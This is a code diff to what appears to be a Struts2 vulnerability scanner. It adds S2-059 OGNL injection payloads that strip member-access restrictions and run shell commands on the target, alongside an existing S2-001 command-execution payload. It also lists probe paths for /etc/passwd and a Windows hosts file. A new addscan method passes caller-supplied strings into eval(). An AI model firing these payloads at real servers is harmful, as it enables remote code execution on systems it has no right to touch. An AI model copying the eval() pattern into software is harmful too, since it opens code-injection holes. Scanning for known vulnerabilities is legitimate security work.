@@ -5,17 +5,20 @@
     ApacheStruts2扫描类: 
         Struts2 远程代码执行
             S2-001
-                Payload来自: https://vulhub.org/#/environments/struts2/s2-001/
+                Payload: https://vulhub.org/#/environments/struts2/s2-001/
             S2-005
-                Payload来自: https://blog.csdn.net/mole_exp/article/details/122550317
+                Payload: https://blog.csdn.net/mole_exp/article/details/122550317
             S2-007
-                Payload来自: https://vulhub.org/#/environments/struts2/s2-007/
+                Payload: https://vulhub.org/#/environments/struts2/s2-007/
             S2-008
-                Payload来自: https://www.cnblogs.com/peace-and-romance/p/15630627.html
+                Payload: https://www.cnblogs.com/peace-and-romance/p/15630627.html
             S2-009
-                Payload来自: https://www.cnblogs.com/Feng-L/p/13644828.html
+                Payload: https://www.cnblogs.com/Feng-L/p/13644828.html
             S2-012(CVE-2013-1965)
-                Payload来自: 
+                Payload: 
+            
+            S2-059
+                Payload: https://www.h5w3.com/199714.html
 file:///etc/passwd
 file:///C:\Windows\System32\drivers\etc\hosts
 '''
@@ -100,6 +103,17 @@ class Struts2():
             {
                 'path': '?name=%25%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B%22echo%22%2C%20%22{}%22%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D'.format(self.md),
                 'data': ''
+            }
+        ]
+
+        self.s2_059_payloads = [
+            {
+                'path': "?payload=%25%7b%23_memberAccess.allowPrivateAccess%3Dtrue%2C%23_memberAccess.allowStaticMethodAccess%3Dtrue%2C%23_memberAccess.excludedClasses%3D%23_memberAccess.acceptProperties%2C%23_memberAccess.excludedPackageNamePatterns%3D%23_memberAccess.acceptProperties%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D%40java.lang.Runtime%40getRuntime()%2C%23s%3Dnew%20java.util.Scanner(%23a.exec('ls%20-al').getInputStream()).useDelimiter('%5C%5C%5C%5CA')%2C%23str%3D%23s.hasNext()%3F%23s.next()%3A''%2C%23res.print(%23str)%2C%23res.close()%0A%7d",
+                'data': ""
+            },
+            {
+                'path': "",
+                'data': "payload=%25%7b%23_memberAccess.allowPrivateAccess%3Dtrue%2C%23_memberAccess.allowStaticMethodAccess%3Dtrue%2C%23_memberAccess.excludedClasses%3D%23_memberAccess.acceptProperties%2C%23_memberAccess.excludedPackageNamePatterns%3D%23_memberAccess.acceptProperties%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D%40java.lang.Runtime%40getRuntime()%2C%23s%3Dnew%20java.util.Scanner(%23a.exec('ls%20-al').getInputStream()).useDelimiter('%5C%5C%5C%5CA')%2C%23str%3D%23s.hasNext()%3F%23s.next()%3A''%2C%23res.print(%23str)%2C%23res.close()%0A%7d"
             }
         ]
 
@@ -416,7 +430,10 @@ class Struts2():
                 }
                 return results
 
-    def addscan(self, url):
+    def addscan(self, url, vuln=None):
+        if vuln:
+            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))
+
         return [
             thread(target=self.s2_001_scan, url=url),
             thread(target=self.s2_005_scan, url=url),
